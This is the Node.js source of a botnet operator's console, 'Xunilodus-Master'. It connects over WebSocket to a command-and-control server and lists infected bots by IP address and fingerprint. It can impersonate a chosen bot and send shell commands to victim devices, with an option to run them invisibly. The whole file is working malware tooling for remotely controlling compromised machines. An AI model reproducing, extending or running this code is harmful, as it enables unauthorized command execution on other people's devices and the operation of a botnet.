#!/usr/bin/env node

const yargs = require('yargs');
const WebSockets = require('websocket');
const prompt = require('prompt');
const { BotnetFrame, MessageType, SenderType, StatusCode, CommandFlags, CommandID } = require('./sfxtp');


//#region [ Arguments validators ]

var argv = yargs.scriptName('Xunilodus-Master')
  .usage("Usage: $0 --address=hostname --port=port_value [ --ws | --wss ]")
  .example("$0 --address=177.44.78.199 --port=44335 --ws", "Connect to Xunilodus Server botnet on port 44335 using the WS protocol.")
  .command('address', 'The address to connect with target server.', {
    'address': {
      description: 'The address to connect with target server.',
      demandOption: "The address of server is required.",
      type: 'string',
    }
  }).command('port', 'The port to listen for incoming connections.', {
    'port': {
      description: 'The port to listen for incoming connections.',
      type: 'string',
    }
  }).option('ws', {
    description: 'Tell the Xunilodus Master to open the connection using the Web Socket protocol.',
    type: 'boolean',
  }).option('wss', {
    description: 'Tell the Xunilodus Master to open the connection using the Web Socket Secure protocol.',
    type: 'boolean',
  }).help().alias('help', 'h').argv;

if (!argv['ws'] && !argv['wss']){
  console.log('[?] You should specify what protocol use for connect with Xunilodus Server [ --ws | --wss ]');
  process.exit(1);
}

if (!argv['address']){
  console.log('[?] You should specify the remote address of Xunilodus Server eg.: [ --address=177.44.78.199 ]');
  process.exit(1);
}

if (!argv['port']){
  console.log('[?] Parameter --port not specified. Presuming default 44335');
  argv['port'] = 44335;
}

//#endregion

prompt.start();
prompt.message = '>';
prompt.delimiter = '';

var ImpersonationData = {
  IsImpersonating: false,
  ImpersonatedFingerprint: ''
};
var WebSockConnection = null;
var SequenceIdentifierTable = [];
var WebSock = new WebSockets.client();

function WebSockSendQuery(commandId, commandFlags, dstFingerprint, status, payload){
  let DstFingerprint = parseInt(dstFingerprint || '00', 16);
  let CmdFlags = commandFlags;
  let CmdIdentifier = commandId;
  let StsCode = status;
  let PayloadData = JSON.stringify(payload);

  if ((commandId == CommandID.EXECUTE_SHELLCODE) && ImpersonationData.IsImpersonating){
    DstFingerprint = parseInt(ImpersonationData.ImpersonatedFingerprint, 16);
  }

  WebSockConnection.send(
    BotnetFrame.build(
      MessageType.QUERY, 
      Math.floor(Math.random() * 0xffffffff), 
      SenderType.MASTER, DstFingerprint, 
      CmdFlags, 0, StsCode, CmdIdentifier, 
      0x7ffddeee, PayloadData
    ).Bytes
  );
}

function KeyboardInputProcessor(){
  prompt.get({ description: `${(ImpersonationData.IsImpersonating ? ' [' + ImpersonationData.ImpersonatedFingerprint + '] ' : ' ')}`, type: 'string' }, function(err, result){
    if (!err){
      let args = yargs(result.question)
        .command('fingerprint', 'Specifies the destination fingerprint.', {
          'fingerprint': {
            description: 'Specifies the destination fingerprint.',
            type: 'string',
          }
        })
        .command('shell', 'The command to be evaluated in the remote device.', {
          'shell': {
            description: 'The command to be evaluated in the remote device.',
            type: 'string',
          }
        }).option('invisible', {
          description: 'Tell the Xunilodus to execute the shell command in invisible mode.',
          type: 'boolean',
        }).option('visible', {
          description: 'Tell the Xunilodus to execute the shell command in visible mode.',
          type: 'boolean',
        }).option('maximized', {
          description: 'Tell the Xunilodus to execute the shell command in maximized mode.',
          type: 'boolean',
        }).option('minimized', {
          description: 'Tell the Xunilodus to execute the shell command in minimized mode.',
          type: 'boolean',
        }).help(false).argv;

      if (args._.length == 0){
        console.log('[!] You should provide at least one command!');
        return KeyboardInputProcessor();
      }

      let CmdIdentifier = {
        'LISTBOTS': { 
          Id: CommandID.LIST_BOTS,
          Status: StatusCode.QUERY_INFO
        },
        'IMPERSONATE': { 
          Id: CommandID.IMPERSONATE,
          Status: StatusCode.QUERY_SENT
        },
        'DEPERSONATE': { 
          Id: CommandID.DEPERSONATE,
          Status: StatusCode.QUERY_SENT
        },
        'SHELLCODE': { 
          Id: CommandID.EXECUTE_SHELLCODE,
          Status: StatusCode.QUERY_SENT
        },
        'HELP': { 
          Id: CommandID.HELP,
          Status: StatusCode.QUERY_INFO
        }
      } [args._[0].toUpperCase()];
      
      if (typeof CmdIdentifier == 'undefined'){
        console.log('[!] Command "' + args._[0] + '" not recognized as internal or external Xunilodus command. Try use command HELP for get some info.');
        return KeyboardInputProcessor();
      }

      let CmdFlags = 0;

      CmdFlags |= (args['invisible'] ? CommandFlags.INVISIBLE : 0);
      CmdFlags |= (args['visible']   ? CommandFlags.VISIBLE   : 0);
      CmdFlags |= (args['maximized'] ? CommandFlags.MAXIMIZED : 0);
      CmdFlags |= (args['minimized'] ? CommandFlags.MINIMIZED : 0);

      if (!(new RegExp(/[0-9a-fA-F]{8}/)).test(args['fingerprint']))
        args['fingerprint'] = '';

      if (!args['command'])
        args['command'] = '';

      if (args['fingerprint'] && (CmdIdentifier.Id == CommandID.IMPERSONATE) && !ImpersonationData.IsImpersonating){
        ImpersonationData.ImpersonatedFingerprint = String(args['fingerprint']).toUpperCase();
      }

      WebSockSendQuery(CmdIdentifier.Id, CmdFlags, args['fingerprint'], CmdIdentifier.Status, { shellcode: args['shell'] });
    } else {
      console.log('[!] Something went wrong!');
      return KeyboardInputProcessor();
    }
  });
}

function OnFrameReceived(frame){
  if (frame.MessageType == MessageType.RESPONSE){
    if (frame.SenderType == SenderType.COMMAND_CONTROL){
      switch (frame.StatusCode){
        case StatusCode.RESPONSE_SENT:{
          
          switch (frame.CommandID){
            case CommandID.IMPERSONATE:{
              ImpersonationData.IsImpersonating = true;
              console.log(`[+] ${JSON.parse(frame.Payload).message}`);
            } break;
            case CommandID.DEPERSONATE:{
              ImpersonationData.IsImpersonating = false;
              console.log(`[+] ${JSON.parse(frame.Payload).message}`);
            } break;
            case CommandID.EXECUTE_SHELLCODE:{
              console.log(`${JSON.parse(frame.Payload).cmd_result}`);
            } break;
          }

        } break;
        case StatusCode.ERROR_STATUS:{
          
          switch (frame.CommandID){
            case CommandID.IMPERSONATE:{
              console.log(`[!] ${JSON.parse(frame.Payload).message}`);
            } break;
            case CommandID.EXECUTE_SHELLCODE:{
              console.log(`[!] ${JSON.parse(frame.Payload).message}`);
            } break;
          }

        } break;
        case StatusCode.RESPONSE_INFO:{

          switch (frame.CommandID){
            case CommandID.LIST_BOTS:{
              let data = JSON.parse(frame.Payload);
              for (let x = 0; x < data.length; x++){
                console.log(`${x+1}) IP Address: ${data[x].RemoteAddress} | Fingerprint: ${data[x].Fingerprint} | Me Device?: ${data[x].IsOwnDevice}`);
              }
            } break;
            case CommandID.HELP:{
              let data = JSON.parse(frame.Payload);
              console.log(`[+] Showing current commands available.\n`);
              for (let x in data){
                console.log(`${data[x].cmd_name}:\nDescription: ${data[x].cmd_desc}\nUsage: ${data[x].cmd_usage}\n`);
              }
            } break;
          }

        } break;
      }
      KeyboardInputProcessor();
    }
  }
}

WebSock.on('connect', (connection) => {
  WebSockConnection = connection;
  console.log('[+] Connection established with success.\n');
  KeyboardInputProcessor();
  connection.on('message', (data) => {
    console.log('[+] New response received from Command Control.\n');
    if (data.type == 'binary'){
      try{
        OnFrameReceived(new BotnetFrame(data.binaryData));
      } catch(e){
        console.log('[-] The master sent an invalid buffer. Ignoring the received frame...');
      }
    }
  });
  connection.on('close', (code, desc) => {
    console.log('[-] The connecting was closed. Received code: ' + code + ' with description: ' + desc);
    process.exit(1);
  });
  connection.on('error', (err) => {
    console.log('[-] Something went wrong. Please try again or change the remote address and port. Check the protocol as well.\n' + err.message);
    process.exit(1);
  });
});

WebSock.on('connectFailed', (err) => {
  console.log('[-] Failed to connect to remote Xunilodus Server. Did you forget the address/port?');
  process.exit(1);
});

console.log('[!] Connecting to the remote server...');
WebSock.connect((argv['wss'] ? 'wss' : (argv['ws'] ? 'ws' : 'ws')) + '://' + argv['address'] + (argv['port'] ? ':' + argv['port'] : ''));

